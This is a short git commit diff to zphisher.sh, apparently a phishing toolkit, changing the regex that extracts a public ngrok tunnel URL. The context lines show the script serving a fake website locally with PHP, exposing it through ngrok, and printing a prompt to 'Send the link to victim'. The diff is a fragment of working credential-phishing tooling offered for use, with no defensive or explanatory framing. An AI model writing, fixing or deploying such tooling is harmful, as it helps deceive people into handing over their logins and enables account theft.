bbc2dbba073a644c36722b1291905869f1f64b0c
ramees01 <70532769+ramees01@users.noreply.github.com>
2021-09-01 16:05:25 +0530

    Update zphisher.sh

--- zphisher.sh
+++ zphisher.sh
@@ -341,7 +341,7 @@ cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 found
 }
